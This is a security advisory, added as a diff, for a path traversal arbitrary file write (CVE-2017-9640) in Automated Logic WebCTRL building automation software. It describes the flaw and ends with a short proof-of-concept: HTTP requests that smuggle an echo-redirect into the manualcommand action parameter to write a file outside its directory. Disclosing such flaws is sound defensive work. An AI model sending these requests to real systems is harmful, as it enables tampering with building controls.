@@ -1,0 +1,64 @@
+Automated Logic WebCTRL 6.1 Path Traversal Arbitrary File Write
+
+
+Vendor: Automated Logic Corporation
+Product web page: http://www.automatedlogic.com
+Affected version: ALC WebCTRL, SiteScan Web 6.1 and prior
+                  ALC WebCTRL, i-Vu 6.0 and prior
+                  ALC WebCTRL, i-Vu, SiteScan Web 5.5 and prior
+                  ALC WebCTRL, i-Vu, SiteScan Web 5.2 and prior
+
+Summary: WebCTRL®, Automated Logic's web-based building automation
+system, is known for its intuitive user interface and powerful integration
+capabilities. It allows building operators to optimize and manage
+all of their building systems - including HVAC, lighting, fire, elevators,
+and security - all within a single HVAC controls platform. It's everything
+they need to keep occupants comfortable, manage energy conservation measures,
+identify key operational problems, and validate the results.
+
+Desc: The vulnerability is triggered by an authenticated user that can use
+the manualcommand console in the management panel of the affected application.
+The ManualCommand() function in ManualCommand.js allows users to perform additional
+diagnostics and settings overview by using pre-defined set of commands. This
+can be exploited by using the echo command to write and/or overwrite arbitrary
+files on the system including directory traversal throughout the system.
+
+Tested on: Microsoft Windows 7 Professional (6.1.7601 Service Pack 1 Build 7601)
+           Apache-Coyote/1.1
+           Apache Tomcat/7.0.42
+           CJServer/1.1
+           Java/1.7.0_25-b17
+           Java HotSpot Server VM 23.25-b01
+           Ant 1.7.0
+           Axis 1.4
+           Trove 2.0.2
+           Xalan Java 2.4.1
+           Xerces-J 2.6.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5430
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5430.php
+
+CVE ID: CVE-2017-9640
+CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9640
+
+
+30.01.2017
+
+--
+
+
+PoC:
+
+GET /_common/servlet/lvl5/manualcommand?wbs=251&action=echo%20peend>..\touch.txt&id=7331 HTTP/1.1
+Host: TARGET
+
+---
+
+GET http://TARGET/touch.txt HTTP/1.1
+
+peend
